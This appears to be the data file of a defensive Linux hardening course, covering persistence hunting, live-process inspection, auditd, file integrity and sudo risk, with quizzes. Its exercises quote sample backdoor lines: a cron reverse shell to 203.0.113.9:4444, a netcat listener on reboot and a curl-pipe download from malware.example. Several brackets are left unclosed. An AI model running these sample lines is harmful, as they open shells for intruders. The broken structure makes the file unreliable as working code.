 {id:'j3',title:'Debian and deeper Linux',bloom:'Analyze',sum:'What differs from Mint and Ubuntu, then unit files, process trees, AppArmor and SELinux, file integrity, the firewall layers, sudo risk, and finding persistence.',
  can:'read a unit file and a process tree, explain AppArmor and SELinux, check file integrity, layer the firewall, judge sudo risk, and find persistence',
  blocks:[
   C('Debian differences and deeper hardening','Analyze',
     TIPS('Debian (12 "bookworm", 13 "trixie") is close to Ubuntu but leaner. New installs ship without rsyslog, so read the systemd journal with <code>journalctl</code> rather than /var/log/auth.log.',
          'Give fail2ban <code>backend = systemd</code> so it reads the journal too. Some setups use a custom admin group; confirm with <code>sudo -l</code> and <code>/etc/sudoers</code>.',
          'The default install ships without a firewall front end: ufw may be absent. Check with <code>which ufw</code>; nftables is the native packet filter.',
          '<b>The hosts file answers first.</b> /etc/hosts (C:\\Windows\\System32\\drivers\\etc\\hosts on Windows) answers name lookups before DNS, so a planted line can send update servers to 127.0.0.1 and quietly stop patching.',
          'Anything beyond the localhost lines needs a reason. <code>getent hosts NAME</code> prints the answer programs get.',
          '<b>Main file and drop-ins.</b> sshd_config.d, sudoers.d, sysctl.d, cron.d, and sources.list.d add settings beside a main file, so read the directory too.',
          'sshd keeps the first value it reads for most settings, and Debian and Ubuntu put its Include line first in sshd_config, so a drop-in beats the main file.',
          '<b>A repository is a trust decision.</b> apt installs whatever its sources and signing keys offer, so an unknown PPA, a planted file in /etc/apt/sources.list.d, a stray key in /etc/apt/trusted.gpg.d (trusted for every source), or [trusted=yes] lets someone else ship your updates.'),
     CMDS('Audit and investigate',[
       ['sudo journalctl -p err -b','Errors since boot. Add --since "1 hour ago" to narrow.'],
       ['sudo journalctl -u ssh --since today','Logs for one service.'],
       ['systemctl list-unit-files --state=enabled','What starts at boot. Keep enabled only what the brief needs.'],
       ['crontab -l; sudo crontab -l','User and root cron jobs. Also check /etc/cron.* and /etc/crontab for rogue entries.'],
       ['ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly','Cron drop-in directories: a classic persistence spot.'],
       ['sudo grep -R "" /etc/systemd/system/*.service 2>/dev/null | grep -i exec','Look at ExecStart lines for odd commands in custom units.'],
       ['sudo ss -tulnp','Listening sockets with process. Match to the services you expect.'],
       ['sudo lsof -i -nP 2>/dev/null','Every network connection by process, confirming what ss shows.'],
       ['sudo find / -newermt "2026-01-01" -type f 2>/dev/null | grep -vE "^/proc|^/sys"','Files changed after a date: scoping recent tampering.'],
       ['sudo sed -i.bak \'/sysupd/d\' /etc/rc.local','Deletes each line that names the planted program (here sysupd), once you have recorded it. Preview first with sed -n \'/sysupd/p\' /etc/rc.local.']
     ]),
     DETAIL('Name lookup order and common Debian services',
       TIPS('<code>/etc/nsswitch.conf</code> sets the lookup order (<code>hosts: files dns</code>), and <code>/etc/resolv.conf</code> names the DNS servers (127.0.0.53 means systemd-resolved: ask <code>resolvectl status</code>).',
            'Services you may meet: Apache or nginx, MySQL/MariaDB, Samba, Postfix, vsftpd, and Bind9. Harden the ones the brief keeps.'))),
    ANATOMY('One crontab line: five time fields, then the command',[
     {name:'A crontab line',tag:'crontab -l',tone:'l3',children:[
       {name:'Schedule',tag:'five time fields',tone:'l2',grid:true,children:[
         {name:'Minute',tag:'0–59',tone:'l1',text:'<code>30</code> at minute 30'},
         {name:'Hour',tag:'0–23',tone:'l1',text:'<code>3</code> in the 03:00 hour'},
         {name:'Day of month',tag:'1–31',tone:'l1',text:'<code>*</code> any day'},
         {name:'Month',tag:'1–12',tone:'l1',text:'<code>*</code> every month'},
         {name:'Day of week',tag:'0–7',tone:'l1',text:'<code>1</code> Monday (0 and 7 are Sunday)'}]},
       {core:true,name:'Command',sub:'<code>/usr/local/bin/backup.sh</code>, run through /bin/sh as the crontab’s owner'}]}
   ],{intro:'A <code>*</code> means every value, <code>*/5</code> every fifth one, and <code>@reboot</code> replaces all five fields with “once, when cron starts at boot”.',
     label:'A crontab line has five time fields (minute, hour, day of month, month, and day of week) followed by the command it runs. This one runs a backup script at 03:30 every Monday.',
     strip:['This line','30 3 * * 1 backup.sh','30 3 * * 1 /usr/local/bin/backup.sh runs the backup script at 03:30 every Monday.'],
     facts:{head:['Where','What to know'],rows:[
       ['Per-user crontabs','<code>crontab -l</code> and <code>sudo crontab -l</code> list them; Debian and Ubuntu keep one file per user in <code>/var/spool/cron/crontabs</code>.'],
       ['System crontab','<code>/etc/crontab</code>: a sixth field names the user, before the command.'],
       ['Drop-in files','<code>/etc/cron.d/</code>: the same format as /etc/crontab, user field included.'],
       ['Period folders','<code>/etc/cron.hourly</code>, <code>cron.daily</code>, <code>cron.weekly</code>, and <code>cron.monthly</code> hold plain scripts; run-parts runs each one on that period.'],
       ['systemd timers','<code>systemctl list-timers</code>: a second scheduler to check alongside cron.'],
       ['Is it stock?','<code>sudo dpkg --verify cron cron-daemon-common</code> prints <code>??5?????? c /etc/crontab</code> when the file differs from the package’s copy. <code>dpkg -S FILE</code> answering “no path found” marks a hand-placed job.']]},
     note:'<b>Persistence lives in every one of these places.</b> Look closely at <code>@reboot</code> lines and short intervals such as <code>* * * * *</code>, especially when the command reaches the network.'}),
   DETAIL('What a stock /etc/crontab holds',
     P('A stock /etc/crontab runs only run-parts for the four period folders. On Ubuntu 24.04 and Mint 22, the cron-daemon-common package owns it.')),
   HIER('Where persistence hides on Linux',
     {name:'Anything that runs again',note:'Check each place, then hunt for what planted it',tone:'bad',children:[
       {name:'Schedulers',note:'cron (crontab -l and /etc/cron.*), systemd timers (systemctl list-timers --all), and at jobs (atq)',tone:'l2'},
       {name:'Boot',note:'systemd units (systemctl list-unit-files --state=enabled), /etc/rc.local, and /etc/init.d',tone:'l3'},
       {name:'Sign-in',note:'/etc/profile, /etc/profile.d, /etc/bash.bashrc, each user’s .bashrc and .profile, and ~/.ssh/authorized_keys',tone:'l4'},
        {name:'Libraries and modules',note:'Code that trusted programs load or run for you',tone:'amber',children:[
         {name:'/etc/ld.so.preload',note:'Loads a library into every program; absent or empty is normal',tone:'amber'},
         {name:'PAM modules',note:'A .so in /usr/lib/<wbr>x86_64-linux-gnu/<wbr>security/ that /etc/pam.d loads sees every password; <code>dpkg -S NAME.so</code> (the bare name: Debian 12 records these under /lib) answering “no path found” is a finding',tone:'amber'},
         {name:'User units',note:'<code>systemctl --user</code> <code>list-unit-files</code> as each user',tone:'amber'},
         {name:'/etc/update-motd.d',note:'Runs as root at every SSH and console sign-in on Debian, Ubuntu, and Mint',tone:'amber'},
         {name:'Python .pth files',note:'A line that starts with <code>import</code> in a .pth file under site-packages or dist-packages runs at every Python start; <code>dpkg -S FILE</code> names the stock ones',tone:'amber'}]}]},
     {intro:'A backdoor that survives a reboot has a starter. Here are the four families on Linux, each with its check. Audit, and record before you remove.',
      caption:'Schedulers, boot, sign-in, and code trusted programs load: remove the starter first, then the program it runs.',
      key:[['l2','Runs on a schedule'],['l3','Runs at boot'],['l4','Runs at sign-in'],['amber','Loaded or run by trusted programs']]}),
   ANATOMY('One .service file',[
     {name:'/etc/systemd/system/makai-api.service',tag:'admin-made',tone:'l2',children:[
      {name:'[Unit]',tag:'what it is',tone:'l1',text:'<code>Description=</code> Makai stock API<br>Check: the brief names it'},
      {name:'[Service]',tag:'what runs, as whom',tone:'l4',children:[
       {name:'ExecStart=',tag:'program',tone:'l4',text:'/usr/local/<wbr>bin/makai-api<br>Check: root owns it, outside /tmp, /home, and dot-folders'},
       {name:'User=',tag:'account',tone:'l3',text:'<code>makai</code><br>Check: root only when the job needs it'},
       {name:'Restart=',tag:'after a crash',tone:'amber',text:'<code>on-failure</code><br>Check: on-failure and always both revive a kill -9; end it with <code>systemctl</code> <code>disable</code> <code>--now</code>'}]},
      {name:'[Install]',tag:'when it starts',tone:'l3',text:'<code>WantedBy=multi-user.target</code>: every boot once enabled<br>Check: <code>systemctl is-enabled</code>'}]}
    ],{intro:'Three sections of key=value lines; read each against its check.',
     bloom:'Analyze',
     facts:{head:['Units in','Ask'],rows:[
      ['/usr/lib/<wbr>systemd/<wbr>system (/lib/… on Debian 12)','Package-made: <code>dpkg -S</code> <code>NAME.service</code> names it'],
      ['/etc/systemd/<wbr>system','Admin-made or an override: explain each']]},
     note:'<code>systemctl cat makai-api</code> prints the unit plus its drop-ins, which can replace ExecStart.'}),
    HIER('A process tree with one bad branch',
     {name:'systemd',note:'PID 1, root',tone:'ok',children:[
      {name:'sshd (812)',note:'root: SSH listener',tone:'ok'},
      {name:'apache2 (1190)',note:'root: opens ports 80 and 443',tone:'ok',children:[
       {name:'workers (1204, 1205)',note:'www-data: serve pages',tone:'ok'},
       {name:'worker (1206)',note:'www-data',tone:'amber',children:[
        {name:'sh (4471)',note:'A web worker rarely starts a shell (PHP mail() is one case): read what it runs',tone:'bad',children:[
         {name:'/tmp/.x/kupd (4473)',note:'Hidden folder, connects to 203.0.113.9: a call-home',tone:'bad'}]}]}]}]},
     {intro:'<code>ps -ef --forest</code> or <code>pstree -p</code> shows who started whom, as which user, from which path.',
      bloom:'Analyze',
      note:'<b>Record, then contain:</b> <code>sudo ls -l /proc/4473/exe</code>, <code>sudo ss -tnp</code>, and <code>sudo sha256sum /proc/4473/exe</code>. Isolate the host; killing 4473 alone leaves the webshell.',
      key:[['ok','Expected'],['amber','Parent of the problem'],['bad','Investigate']],
      caption:'Parents explain children: a shell under a web server is a finding.'}),
    C('Investigate a live process','Analyze',
     P('A process name is a label the program picked. The kernel’s records in <code>/proc/PID</code> and a tracer show what it really runs, holds open, loads, and calls. Record each answer, then stop it.'),
     CMDS('Read /proc, then trace',[
       ['sudo ls -l /proc/4473/exe','The program file it runs. A kernel thread such as <code>[kworker/0:1]</code> lacks one, so a <code>[kworker]</code> name with a program file is a disguise; <code>(deleted)</code> after the path means the file was removed while it runs.'],
       ['sudo cat /proc/4473/cmdline | tr \'\\0\' \' \'','Its command line. NUL bytes end each argument, so tr turns them into spaces. A program can rewrite this line, so trust exe over it.'],
       ['cat /proc/4473/status','Name, state, PPid, and Uid. A real kernel thread shows PPid 2 and skips the Vm memory lines.'],
       ['sudo cat /proc/4473/environ | tr \'\\0\' \'\\n\'','Its environment at start, readable by its owner and root. LD_PRELOAD here loads a library into it ahead of all others.'],
       ['sudo ls -l /proc/4473/fd','Every file and socket it holds open, by number: a password file held open is a finding.'],
       ['sudo cat /proc/4473/maps','Every file mapped into its memory: the program, its libraries, and any preloaded library from an odd folder. <code>sudo pmap 4473</code> prints the same map with sizes.'],
       ['ldd /usr/bin/ls','The libraries a program asks for. One in maps that ldd leaves out came from LD_PRELOAD or /etc/ld.so.preload. ldd may run code from the file, so read a distrusted program with <code>objdump -p</code> instead.'],
       ['sudo strace -p 4473 -e trace=network','Attaches and prints each network system call, connect() with its address included, until Ctrl+C detaches. <code>-e trace=file</code> shows the paths it opens, <code>-f</code> follows its children, <code>-o FILE</code> saves the trace, and <code>-s 200</code> prints longer strings.'],
       ['strace -e trace=file cat /etc/hostname','Runs a command under strace: each file it opens, with the error for any it may not read.'],
       ['sudo ltrace -p 4473','Library calls rather than system calls, such as <code>inet_addr("203.0.113.9")</code>; <code>-e connect</code> picks one. Install it with sudo apt install ltrace.'],
       ['sudo fuser -v /etc/shadow','Each process that holds a file open (f), runs it (e), or maps it (m). <code>-n tcp 4444</code> names the process on a port; <code>-k</code> kills every match, so read the -v list first.'],
       ['sudo inotifywait -m -r /etc/cron.d','Prints each change (CREATE, MODIFY, DELETE) as it happens until Ctrl+C; <code>-e modify,create,delete</code> narrows it. Install it with sudo apt install inotify-tools.'],
       ['sudo unhide proc','Compares /proc with the output of ps: a PID ps leaves out means a changed ps or a rootkit. <code>sudo unhide-tcp</code> checks ports the same way. Install it with sudo apt install unhide.']
     ]),
     TIPS('<b>Why sudo:</b> Ubuntu sets <code>kernel.yama.ptrace_scope</code> to 1, so a plain user may trace only its own children, and <code>strace -p</code> on any other process reports “Operation not permitted.”',
          '<b>Stop it for good:</b> <code>systemctl status 4473</code> names the unit that starts it, and Restart=always revives a plain kill. Disable the unit, then delete the program, its preloaded library, and the starter.')),
    C('Kernel and logging baseline','Apply',
     CMDS('sysctl, auditd, and the journal',[
       ['sudo sysctl -w net.ipv4.ip_forward=0','Forwarding off keeps a host that only serves from becoming an attacker’s pivot. Persist it in /etc/sysctl.d/.'],
       ['sudo sysctl -w net.ipv4.conf.all.rp_filter=1','Strict reverse-path filtering (anti-spoofing) suits a host on one network; Ubuntu ships 2, loose, for two paths out. Each interface uses the higher of all and its own value.'],
       ['sudo sysctl -w net.ipv4.icmp_echo_ignore_broadcasts=1','Ignore broadcast pings (smurf protection).'],
       ['sudo sysctl -w kernel.randomize_va_space=2','Full ASLR, a memory-corruption mitigation.'],
       ['sudo apt install auditd && sudo systemctl enable --now auditd','Kernel audit logging of security events.'],
       ['sudo auditctl -w /etc/passwd -p wa -k identity','An audit watch rule: log writes (w) and attribute changes (a) to /etc/passwd under the key identity. Persist rules in /etc/audit/rules.d/.'],
       ['sudo ausearch -k identity','Answers “who changed /etc/passwd, and when”.'],
       ['sudo aa-status','AppArmor: which profiles run in enforce or complain mode. A stopped AppArmor is a finding.'],
       ['journalctl --list-boots','Several boots listed: the journal survives reboots. Only one: set Storage=persistent in /etc/systemd/journald.conf and restart systemd-journald.']
     ]),
     DETAIL('Kernel keys, audit rules, SUID lists, and hidden root',
       TIPS('<b>/etc/sysctl.d/99-hardening.conf:</b> net.ipv4.ip_forward = 0; accept_redirects 0 and send_redirects 0 (all and default); accept_source_route 0; rp_filter 1; log_martians 1; tcp_syncookies 1; icmp_echo_ignore_broadcasts 1; icmp_ignore_bogus_error_responses 1; IPv6 accept_redirects 0 and accept_source_route 0; kernel.randomize_va_space 2, kptr_restrict 2, dmesg_restrict 1, and sysrq 0; fs.protected_hardlinks 1, protected_symlinks 1, and suid_dumpable 0. Load every file with <code>sudo sysctl --system</code>; <code>sysctl -p</code> reads /etc/sysctl.conf alone. secure_redirects 0 (all and default) completes the redirect set. <b>Which file wins:</b> on Ubuntu 24.04 and Mint 22, /etc/sysctl.conf is read last (at boot as /etc/sysctl.d/99-sysctl.conf, which sorts after 99-hardening.conf), so a line there overrides the drop-in; Ubuntu 26.04 skips /etc/sysctl.conf at boot, so a value set only there is gone after the next reboot. With ufw enabled, ufw applies /etc/ufw/sysctl.conf each time it starts. Search all three before you trust a value (<code>sudo grep -rn KEY /etc/sysctl.conf /etc/sysctl.d/ /etc/ufw/sysctl.conf</code>), and read every interface with <code>sysctl -a 2&gt;/dev/null | grep -E \'redirects|rp_filter\'</code>.',
            '<b>auditd rules</b> (/etc/audit/rules.d/hardening.rules): -w /etc/passwd -p wa -k identity, -w /etc/shadow -p wa -k identity, -w /etc/sudoers -p wa -k sudoers, and -w /etc/sudoers.d/ -p wa -k sudoers. Load them with <code>augenrules --load</code>, list them with <code>auditctl -l</code>, and search with <code>ausearch -k identity</code>. <b>From the first process:</b> auditd starts partway through boot, so add <code>audit=1 audit_backlog_limit=8192</code> to GRUB_CMDLINE_LINUX in /etc/default/grub and run <code>sudo update-grub</code>; the backlog limit sizes the queue that holds early events, and after a reboot <code>grep -o audit=1 /proc/cmdline</code> proves it. <b>Log modes:</b> auditd sets them itself from log_group in /etc/audit/auditd.conf (Ubuntu ships adm, which gives 0640 logs; root gives 0600), so a chmod on the logs lasts only until the next rotation. <b>Who reads logs:</b> root, plus members of adm and systemd-journal; review <code>getent group adm systemd-journal</code> as you review sudo.',
            '<b>Stock SUID on Ubuntu and Mint includes</b> passwd, su, sudo, mount, umount, chsh, chfn, gpasswd, newgrp, pkexec, fusermount3, ssh-keysign, dbus-daemon-launch-helper, and polkit-agent-helper-1. <b>Stock SGID includes</b> chage, expiry, unix_chkpwd, and crontab. Compare a suspect with GTFOBins.',
            '<b>at jobs:</b> <code>atq</code> lists them and <code>atrm</code> removes one.',
            '<b>Hidden root:</b> userdel refuses a second UID 0 account, because root’s own processes share UID 0, and deluser refuses every UID 0 account. Record it for the investigation, read its home with <code>getent passwd NAME</code>, then use <code>userdel -f NAME</code> (add -r only when that home belongs to the account alone), or change its UID with vipw first. For the same reason, <code>pkill -u NAME</code> ends every root process, and deluser’s --no-preserve-root with --remove-all-files deletes every file root owns, so keep both away from a UID 0 account.',
            '<b>Core dumps:</b> * hard core 0 in /etc/security/limits.conf. <b>The Ctrl+Alt+Del reboot:</b> <code>systemctl mask ctrl-alt-del.target</code>.'))),
    COMPARE('Who you are, or what the program may do',[

    C('File integrity monitoring: hashes, watches, and scanners','Apply',
     P('Baseline on a clean day. Then a hash says <b>what</b> changed, and an audit watch says <b>who</b>, and when. <b>File integrity monitoring</b> runs that compare on a timer and alerts the SIEM on each difference.'),
     CMDS('Baseline, compare, and scan',[
      ['sudo sha256sum /etc/passwd /etc/shadow /usr/bin/sudo | sudo tee /root/base.sha256','Record known-good hashes, then copy base.sha256 off the host.'],
      ['sudo sha256sum -c /root/base.sha256 | grep -v \': OK$\'','Only the changed files (FAILED).'],
      ['sudo debsums -s','Package files against their shipped hashes; silent when all match. A root intruder can edit its on-host lists; confirm against a known-good copy.'],
      ['sudo aide --config /etc/aide/aide.conf --check','Added, removed, or changed files since aideinit. Install with sudo apt install --no-install-recommends aide aide-common (skips a mail server on port 25); after hardening, run sudo aideinit -y -f.'],
      ['sudo auditctl -w /var/www/html -p wa -k webroot','Who writes to the web root: <code>ausearch -k webroot</code>.'],
      ['sudo clamscan -r -i /var/www /tmp /home','ClamAV: known-malware signatures; -i lists hits only.'],
      ['sudo rkhunter --check --sk','Rootkit checks: hidden files and changed programs.'],
      ['sudo lynis audit system --quick','A read-only checklist scanner (sudo apt install lynis) that lists warnings and suggestions; sudo grep ^suggestion /var/log/lynis-report.dat lists them again. The brief decides which to apply.']
     ]),
     TIPS('<b>Every change needs a reason.</b> A change with a logged upgrade or ticket is expected: update the baseline. An unlogged new .php in the web root counts as a webshell until proven otherwise: record it and its hash, isolate, then investigate.',
          '<b>Scanners need judgment.</b> rkhunter flags updated programs until <code>rkhunter --propupd</code>, and the EICAR test file trips ClamAV on purpose. Confirm with <code>dpkg -S</code> and <code>debsums</code> before deleting.'),
     DETAIL('Why file hashes repeat, and AIDE’s daily check',
       P('File hashes skip the salt that /etc/shadow uses, so one file always gives one hash. Debian’s aide package adds a daily check.'))),
   QUIZ('j3cy','Check yourself',[
     ['<code>sha256sum -c</code> and <code>debsums -s</code> both flag /usr/bin/ls, and apt’s history shows no update since the baseline. Best read?',['A swapped program: save evidence, isolate, then rebuild from a known-good image','An update changed it; refresh the baseline','sha256sum misreads programs','Delete /usr/bin/ls now'],0,'<code>apt install --reinstall coreutils</code> repairs one file and leaves the intruder, since swapping ls takes root. <a href="#sophomore/s9">Review: Check before you trust: messages, links, and files</a>',{whys:['Two checks agree and no update explains it, so treat ls as swapped and rebuild.','apt’s history shows no update, so a new baseline would bless the swap.','sha256sum hashes any file the same way, programs included.','Deleting it destroys evidence and leaves the intruder’s root access in place.'],imp:'core',c:'lin-auditd'}],
     ['<code>ps aux</code> on makani-web lists <code>[kworker/1:3]</code> as root, and <code>sudo ls -l /proc/2210/exe</code> answers <code>/var/tmp/.font-unix/fcsync</code>. Best read?',['A program posing as a kernel thread: record it, trace it, then remove its starter','A normal kernel worker, since kernel threads run from /var/tmp','A crashed kernel thread that left a file behind','A font helper the kernel started for the web server'],0,'Kernel threads lack a program file, so <code>/proc/PID/exe</code> unmasks the disguise.',{whys:['A kernel thread lacks a program file, so a [kworker] name with one is a disguise to trace before you stop it.','Kernel threads run inside the kernel itself, so a program in a dot-folder under /var/tmp is the evidence.','A kernel thread runs from no file at all, crashed or healthy.','The name is the disguise; the program in a dot-folder under /var/tmp is what to investigate.'],imp:'core',c:'host-process-trees'}],
     ['A process on makani-web keeps calling out, and you want the address before you stop it. As kai, <code>strace -p 2210</code> answers “Operation not permitted.” Best next step?',['Run <code>sudo strace -p 2210 -e trace=network</code>: ptrace_scope 1 lets a plain user trace only its own children','Kill 2210 first, then trace it','Set kernel.yama.ptrace_scope to 3 and retry','Run <code>ldd</code> on PID 2210'],0,'Root may trace any process while ptrace_scope is 1.',{whys:['Root passes the Yama check at scope 1, so sudo strace shows each connect() with its address.','A stopped process makes no more calls, so the address leaves with it.','Scope 3 blocks every tracer, root included.','ldd reads a program file for its libraries and watches no running process.'],imp:'good',c:'det-hunting'}]

    C('Harden a service the brief keeps: MySQL','Apply',
     P('Removing a database the brief keeps breaks the business, so harden it instead. Ubuntu 24.04 and Mint 22 install MySQL 8.0 as mysql-server; Debian ships MariaDB, whose wizard is <code>mariadb-secure-installation</code>.'),
     CMDS('Keep it, then lock it down',[
       ['sudo mysql_secure_installation','A wizard of yes-or-no questions: turn on the password-strength check (then pick a level: 0, 1, or 2), remove anonymous users, allow root from this machine alone, remove the test database, and reload the privilege tables. Answer y to each.'],
       ['sudo grep -R bind-address /etc/mysql/','Expect 127.0.0.1 when only programs on this machine connect (mysqld.cnf for MySQL, 50-server.cnf for MariaDB).'],
       ['sudo ss -tlnp | grep 3306','The proof: 127.0.0.1:3306 answers this machine alone, and 0.0.0.0:3306 answers the whole network. The grep also shows 33060, MySQL’s X Protocol port, which mysqlx-bind-address sets.'],
       ['sudo mysql -e "SELECT user, host, plugin FROM mysql.user;"','Every database account. An empty user name, or root with a host of %, is a finding.']
     ]),
     TIPS('<b>After a config edit,</b> run <code>sudo systemctl restart mysql</code>, then the ss check again.'),
     DETAIL('Why the MySQL wizard runs through sudo',
       P('On Ubuntu and Mint, MySQL’s root account signs in with auth_socket, which trusts the Linux root user. So the wizard connects through sudo and skips setting a root password.'))),
   C('Fix permissions on the files that matter','Apply',
     CMDS('chmod and chown',[
       ['sudo chown root:shadow /etc/shadow /etc/gshadow && sudo chmod 640 /etc/shadow /etc/gshadow','Expect -rw-r----- root shadow on both. unix_chkpwd checks passwords for the screen lock through the shadow group, so 640 root:shadow is the finished state, and 600 root:root breaks unlocking.'],
       ['sudo chown root:root /etc/passwd && sudo chmod 644 /etc/passwd','Expect -rw-r--r-- root root.'],
       ['sudo chmod 440 /etc/sudoers','Expect -r--r----- root root; edit it only with visudo.'],
       ['sudo chmod g-w,o-w FILE','Symbolic form: takes write from group and other, and keeps the owner’s bits.'],
       ['sudo find / -xdev -type d -perm -0002 ! -perm -1000 2>/dev/null','World-writable directories that lack the sticky bit.'],
       ['sudo find / -xdev -type f -perm -2000 2>/dev/null','SGID files. Compare them with a clean VM, as with SUID in Sophomore.']
     ]),
     TIPS('<b>SGID</b> (2000, an s in the group’s x spot) runs a program with its group’s rights; on a directory, new files take the directory’s group. The <b>sticky bit</b> (1000, a t in the other x spot) on a world-writable directory such as /tmp lets only a file’s owner delete or rename it.',
           '<b>A + after the mode</b> (<code>-rw-r-----+</code>) means ACL entries the nine bits hide: <code>getfacl</code> lists them, and <code>setfacl -x u:NAME FILE</code> removes one.',
           '<b>umask</b> sets the bits new files start without: 022 gives 644, and 027 gives 640.',
           'After UMASK 077, sudo-made files start at 640 or stricter. Set key and unit file modes yourself (<code>sudo chmod 644 FILE</code>), then read them back with ls -l.',
           '<code>lsattr</code> shows the immutable flag (i), which blocks even root until <code>chattr -i</code>.'),
     DETAIL('Where the starting umask comes from',
       TIPS('UMASK in /etc/login.defs sets each sign-in’s starting umask through pam_umask; <code>grep -rn pam_umask /etc/pam.d/</code> shows it loaded.',
            'With USERGROUPS_ENAB yes, a user whose primary group is private gets the owner bits copied to the group, so UMASK 077 reads 0007 in that shell.',
            'Ubuntu 24.04 sets HOME_MODE 0750, so new home folders start at 750 whatever UMASK says.'))),
   SCALE('Sudo rules that hide root',{from:'Leaks files',to:'Equals root',bands:[
      ['A wildcard argument','<code>kai ALL=(root)</code> <code>/bin/cat /var/log/*</code>: the * also matches a second path or ../, so kai reads /etc/shadow','amber'],
      ['Environment the caller sets','<code>SETENV:</code>, or <code>env_keep</code> with LD_PRELOAD or PYTHONPATH: kai’s library loads into a root program','bad'],
      ['A script others can write','<code>(root) /opt/sync.sh</code>, and kai can edit sync.sh or its folder: kai’s lines run as root','bad'],
      ['ALL with NOPASSWD','Root for anyone at the keyboard','bad']]},
     {intro:'Past the shell-capable programs in <a href="#sophomore/s3">the sudoers table</a>: judge each rule by the most it lets the caller do.',

   QUIZ('j3cy2','Check yourself',[
     ['Laptops cannot reach a web app on a Mānoa Makerspace Mac. <code>sudo launchctl list</code> shows it running; <code>sudo lsof -nP -iTCP -sTCP:LISTEN</code> shows <code>127.0.0.1:8080</code>. Which check fails first?',['Is it running as a service?','Is it listening on an address others can reach?','Does the firewall let port 8080 in?','Does the log show the failed requests?'],1,'Fix the listen address before the firewall. <a href="#sophomore/s4">Review: Services and ports</a>',{whys:['launchctl list shows it running, so that check passes.','127.0.0.1 answers the Mac alone, so the laptops fail here first.','The firewall matters once the app listens on an address others can reach.','The log comes last; the listen address already explains it.'],imp:'good',c:'lin-macos'}]

    SPOT('j3sp','Spot the persistence: crontab -l','Tap every line that looks like a backdoor or seems out of place, then Check.',[
     ['# m h  dom mon dow   command',null],
     ['0 3 * * * /usr/bin/apt-get update',null,'A daily 3 a.m. refresh of the package lists, through a full system path: routine upkeep.'],
     ['*/5 * * * * /bin/bash -c \'… 203.0.113.9:4444 …\'','bash calling 203.0.113.9 on port 4444 every five minutes: a reverse shell that hands an intruder a shell. Remove it and hunt for whatever installed it.'],
     ['0 2 * * 0 /usr/local/bin/backup.sh',null,'A weekly backup at 2 a.m. on Sunday. It is routine; check that root owns backup.sh, since root runs it.'],
     ['@reboot nc -l -p 1337 …','A netcat backdoor that re-opens on every reboot. Remove.'],

     ['* * * * * curl -s hxxp://malware.example/x.sh | …','Downloads and runs a script every minute (malware.example is a reserved example name). Remove immediately.']

   SPOT('j3sp2','Spot the problems: a unit, sysctl.d, and ls -l','A web server that only serves pages. In the unit file, tap the line that runs the backdoor; in sysctl.d and ls -l, tap every risky line. Then Check.',[
     ['# /etc/systemd/system/sys-health.service',null],
     ['[Service]',null],
     ['ExecStart=/opt/.libupd/agent --connect 203.0.113.9:4444','A hidden folder in /opt and a call out to port 4444: a backdoor. Restart=always below brings it back after a kill, so disable the unit first, then remove both.'],
     ['Restart=always',null,'A normal setting for a service that must stay up. The finding is the program it restarts, so judge the ExecStart line.'],
     ['User=root',null],
     ['# /etc/sysctl.d/99-hardening.conf',null],
     ['net.ipv4.conf.all.rp_filter = 1',null,'rp_filter = 1 drops packets with a forged source address: the hardened setting.'],
     ['net.ipv4.ip_forward = 1','This server only serves, so forwarding turns it into a router an attacker can pivot through. Set 0.'],
     ['kernel.randomize_va_space = 0','ASLR off makes memory attacks easier. Set 2.'],
     ['$ ls -l /etc/shadow /etc/passwd',null],
     ['-rw-r--r-- 1 root shadow 1203 Oct  2 09:14 /etc/shadow','Everyone can read the password hashes. sudo chmod 640 /etc/shadow.'],
     ['-rw-r--r-- 1 root root   2817 Oct  2 09:14 /etc/passwd',null,'/etc/passwd is meant for everyone to read: it lists accounts, and the hashes sit in /etc/shadow.']
   ]),
   SPOT('j3sp3','Spot the problems: ps output, a unit file, and getcap','makani-web serves the Makai Surf Supply site with apache2; kai is a standard user, and the nightly backup needs root. Tap each webshell sign, escalation path, and root-equivalent program, then Check.',[
     ['$ ps -ef --forest   (trimmed)',null],
     ['root       812     1  sshd: /usr/sbin/sshd -D [listener]',null],
     ['root      1190     1  /usr/sbin/apache2 -k start',null],
     ['www-data  2214  1190   \\_ /usr/sbin/apache2 -k start',null,'Workers run as www-data under the root parent apache2: the normal shape. Judge what each worker starts.'],
     ['www-data  5120  2214       \\_ sh -c …','A shell under an apache2 worker: a webshell sign. Record it and isolate the host.'],
     ['www-data  5122  5120           \\_ /dev/shm/.cache/syncd 198.51.100.23 8443','A hidden program in /dev/shm calling an outside address. Capture ss -tnp and its hash.'],
     ['# /etc/systemd/system/backup-nightly.service',null],
     ['User=root',null,'The brief says the backup needs root, so this line fits. The risk is the script root runs.'],
     ['ExecStart=/home/kai/backup.sh','Root runs a script kai can edit, so kai’s additions run as root. Move it to /usr/local/sbin, owned by root.'],
     ['# started nightly by backup-nightly.timer',null],
     ['$ sudo getcap -r / 2>/dev/null',null],
     ['/usr/bin/ping cap_net_raw=ep',null,'ping needs raw sockets to send its echo requests, and cap_net_raw grants exactly that: stock, and far short of root.'],
     ['/usr/bin/python3.11 cap_setuid=ep','cap_setuid lets python3 become root for anyone who runs it. sudo setcap -r, then find who set it.']
    ]),
    QUIZ('j3q','Check: deeper Linux',[
     ['On a fresh Debian install, /var/log/auth.log is missing. Where do you read authentication events?',['It is impossible','journalctl, the systemd journal','/etc/passwd','dmesg only'],1,'Filter SSH sign-ins by unit (journalctl -u ssh): on Debian 13, since OpenSSH 9.8, they come from sshd-session.',{whys:['The events are there; Debian keeps them in the systemd journal.','Debian 12 and later install without rsyslog, so sign-ins go to the systemd journal alone, which journalctl reads.','/etc/passwd lists accounts, without any events.','dmesg shows kernel messages; sign-ins land in the journal.'],imp:'core',c:'lin-debian'}],
     ['A root crontab line reads <code>*/5 * * * * /bin/bash -c \'… 203.0.113.9:4444 …\'</code>. This is',['A backup','A reverse shell backdoor','A system update','A log rotation'],1,'Remove the line, then hunt for what planted it in every cron directory, systemd unit, and .bashrc.',{whys:['A backup copies files to storage; this line calls an outside address.','bash calling an outside address on port 4444 hands an intruder a shell.','Updates come through apt rather than bash calling a bare address.','Log rotation works on local files and stays off the network.'],imp:'core',c:'host-malware-persistence'}],
